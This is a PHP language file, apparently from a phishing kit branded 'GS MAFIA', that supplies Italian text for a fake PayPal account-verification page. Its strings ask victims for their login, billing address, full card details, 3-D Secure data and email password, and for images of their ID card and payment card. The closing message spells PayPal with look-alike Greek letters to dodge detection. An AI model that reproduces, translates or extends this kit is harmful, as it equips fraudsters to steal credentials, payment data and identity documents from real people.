<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "Email";
$gs_string2 = "Avanti";
$gs_string3 = "Problemi di accesso?";
$gs_string4 = "or";
$gs_string5 = "Registrati";
$gs_string6 = "Contattaci";
$gs_string7 = "Privacy";
$gs_string8 = "Legal";
$gs_string9 = "In tutto il mondo";
$gs_string10 = "Cambia";
$gs_string11 = "Accedi";
$gs_string12 = "La tua sicurezza è la nostra massima priorità";
$gs_string13 = "Aggiorna il tuo indirizzo di fatturazione";
$gs_string14 = "Nome";
$gs_string15 = "Cognome";
$gs_string16 = "Indirizzo";
$gs_string17 = "Città";
$gs_string18 = "ZIP";
$gs_string19 = "Continua";
$gs_string20 = "Feedback";
$gs_string21 = "Informazioni sulla scheda di aggiornamento";
$gs_string22 = "Nome del titolare della carta";
$gs_string23 = "Mese";
$gs_string24 = "Anno";
$gs_string25 = "3-D Secure Verification";
$gs_string26 = "Aggiorna l'accesso e-mail";
$gs_string27 = "Indirizzo e-mail";
$gs_string28 = "Password indirizzo e-mail";
$gs_string29 = "Allega una copia della tua carta d'identità";
$gs_string30 = "Allega un'immagine della tua carta (posteriore / anteriore)";
$gs_string31 = "Fine";
$gs_string32 = "Parola d'ordine";
$gs_string33 = "Informazioni sulla carta";
$gs_string34 = "Numero della carta";
$gs_string35 = "Nazione";
$gs_string36 = "Congratulazioni";
$gs_string37 = "<center> Le informazioni del tuo account sono in fase di revisione da parte del nostro staff. <br> <br> Nel frattempo, puoi accedere al tuo account con una sicurezza rafforzata. <br> <br> <b> Grazie per aver scelto ΡayΡal. </ B> <br> <br> <center> <br> <b> Verrai reindirizzato per accedere al tuo account ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Verifica account - Centro sicurezza";
$gs_string39 = "Accedi al tuo conto PayPal";
$gs_string40 = "Verifica dell'account - Centro sicurezza";
?>